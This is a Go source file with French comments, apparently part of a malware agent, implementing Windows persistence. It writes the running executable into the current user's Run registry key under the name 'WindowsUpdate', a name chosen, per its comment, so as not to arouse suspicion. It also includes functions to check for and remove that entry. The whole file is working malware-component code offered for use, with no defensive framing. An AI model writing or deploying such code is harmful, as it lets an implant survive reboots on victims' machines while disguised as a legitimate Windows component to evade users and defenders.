//go:build windows
// +build windows

package persistence

import (
	"fmt"
	"os"

	"golang.org/x/sys/windows/registry"
)

// Ajouter au démarrage via Registry
func AddToStartup(agentPath string) error {
	fmt.Println("[Persistence] Tentative d'ajout au démarrage...")

	// Ouvrir la clé Registry
	key, err := registry.OpenKey(
		registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.SET_VALUE,
	)

	if err != nil {
		return fmt.Errorf("échec ouverture registry: %v", err)
	}
	defer key.Close()

	// Nom discret pour ne pas éveiller les soupçons
	valueName := "WindowsUpdate"

	// Écrire le chemin de l'agent
	err = key.SetStringValue(valueName, agentPath)
	if err != nil {
		return fmt.Errorf("échec écriture registry: %v", err)
	}

	fmt.Printf("[Persistence] Ajouté: %s -> %s\n", valueName, agentPath)
	return nil
}

// Vérifier si déjà dans le startup
func CheckStartup() (bool, string) {
	key, err := registry.OpenKey(
		registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.QUERY_VALUE,
	)

	if err != nil {
		return false, ""
	}
	defer key.Close()

	// Vérifier notre entrée
	value, _, err := key.GetStringValue("WindowsUpdate")
	if err != nil {
		return false, ""
	}

	return true, value
}

// Nettoyer (pour tests)
func RemoveFromStartup() error {
	key, err := registry.OpenKey(
		registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.SET_VALUE,
	)

	if err != nil {
		return err
	}
	defer key.Close()

	return key.DeleteValue("WindowsUpdate")
}

// Setup persistance au démarrage
func SetupPersistence() {
	fmt.Println("\n[Persistance] Configuration...")

	exePath, err := os.Executable()
	if err != nil {
		fmt.Println("  ✗ Erreur chemin:", err)
		return
	}

	if persistent, path := CheckStartup(); persistent {
		fmt.Printf("  ✓ Déjà persistant\n  Chemin: %s\n", path)
	} else {
		fmt.Println("  ➔ Ajout au démarrage Windows...")
		if err := AddToStartup(exePath); err != nil {
			fmt.Printf("  ✗ Échec: %v\n", err)
		} else {
			fmt.Println("  ✓ Persistance activée")
		}
	}
}
